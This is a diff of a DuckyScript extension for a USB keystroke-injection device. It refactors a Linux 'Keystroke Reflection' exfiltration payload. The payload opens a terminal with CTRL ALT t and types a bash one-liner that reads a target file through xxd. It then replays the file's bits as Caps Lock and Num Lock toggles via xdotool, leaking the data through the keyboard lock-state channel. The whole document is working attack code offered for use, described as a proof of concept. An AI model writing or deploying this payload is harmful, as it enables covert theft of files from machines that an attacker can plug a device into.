@@ -2,17 +2,18 @@ EXTENSION LINUX_HID_EXFIL
     REM VERSION 1.1
     REM AUTHOR: Korben
 
-    REM REQUIRES EXFIL_AUTO_EOF_DETECT EXTENSION
+    REM REQUIRES EXTENSION EXFIL_AUTO_EOF_DETECT
 
     REM_BLOCK DOCUMENTATION
         Helpers for Linux Keystroke Reflection data exfiltration 
         This payload is a proof of concept for USB HID only Data Exfiltration 
     
         TARGET:
-            Linux Host that supports opening terminal via CTRL ALT t, and xdotool
+            Linux host that supports opening terminal via CTRL ALT t, and xdotool
     
         USAGE:
             REQUIRES EXFIL_AUTO_EOF_DETECT EXTENSION
+            DETECT_READY EXTENSION RECOMMENDED
             Uncomment the function call below to run this extension inline 
             or call RUN_LINUX_EXFIL() anywhere in your payload after the extension 
     
@@ -23,26 +24,60 @@ EXTENSION LINUX_HID_EXFIL
     REM CONFIGURATION:
     REM File on host machine to exfil using Keystroke Reflection attack
     DEFINE #TARGET_FILE t.txt
+
+    REM Disable (set FALSE or delete) if using RUN_LINUX_EXFIL in an already open terminal
+    DEFINE #INCLUDE_TERM_OPEN TRUE
+    DEFINE #TERMINAL_OPEN_SHORTCUT CTRL ALT t
     DEFINE #TERMINAL_OPEN_DELAY 500
-    DEFINE #READY_TO_TYPE_DELAY 250
+
+    DEFINE #SAVE_AND_RESTORE_LOCKS TRUE
+    DEFINE #ENABLE_EXFIL_LEDS TRUE
 
     FUNCTION RUN_LINUX_EXFIL()
-        LED_OFF
-        DELAY #READY_TO_TYPE_DELAY
-        CTRL ALT t
-        DELAY #TERMINAL_OPEN_DELAY
-        SAVE_HOST_KEYBOARD_LOCK_STATE
+        IF_DEFINED #ENABLE_EXFIL_LEDS
+            LED_OFF
+            $_EXFIL_LEDS_ENABLED = TRUE
+        END_IF_DEFINED
+
+        IF_DEFINED #INCLUDE_TERM_OPEN
+            #TERMINAL_OPEN_SHORTCUT
+            DELAY #TERMINAL_OPEN_DELAY
+        END_IF_DEFINED
+
+        IF_DEFINED #SAVE_AND_RESTORE_LOCKS
+            SAVE_HOST_KEYBOARD_LOCK_STATE
+        END_IF_DEFINED
+
         $_EXFIL_MODE_ENABLED = TRUE
-        $_EXFIL_LEDS_ENABLED = TRUE
         STRINGLN uname -a>#TARGET_FILE
-        STRINGLN c="xdotool key --delay 4";o=" Caps_Lock";l=" Num_Lock";bs=$(xxd -b #TARGET_FILE |cut -d " " -f2-7);for (( i=0;i<${#bs};i++ ));do b="${bs:$i:1}";if [[ "$b" == "0" ]];then c+=$o;fi;if [[ "$b" == "1" ]];then c+=$l;fi;done;eval "$c";exit
+        STRING_BASH
+            o=" Caps_Lock";
+            l=" Num_Lock";
+            c="xdotool key -d4";
+            bs=`xxd -b 
+            #TARGET_FILE
+            |cut -d" " -f2-7`;
+            for((i=0;i<${#bs};i++));do 
+                [[ "${bs:$i:1}" == "0" ]]&&c+=$o||c+=$l;
+            done;
+            $c;
+            exit
+        END_STRING
+
         WAIT_FOR_EOF()
-        $_EXFIL_LEDS_ENABLED = FALSE
+
         $_EXFIL_MODE_ENABLED = FALSE
-        RESTORE_HOST_KEYBOARD_LOCK_STATE
+
+        IF_DEFINED #ENABLE_EXFIL_LEDS
+            $_EXFIL_LEDS_ENABLED = FALSE
+        END_IF_DEFINED
+
+        IF_DEFINED #SAVE_AND_RESTORE_LOCKS
+            RESTORE_HOST_KEYBOARD_LOCK_STATE
+        END_IF_DEFINED
     END_FUNCTION
     
     REM Uncomment the function call below to run this extension inline (here) 
-    REM or call RUN_WINDOWS_EXFIL() anywhere in your payload after the extension 
+    REM or call RUN_LINUX_EXFIL() anywhere in your payload after the extension 
     REM RUN_LINUX_EXFIL()
 END_EXTENSION
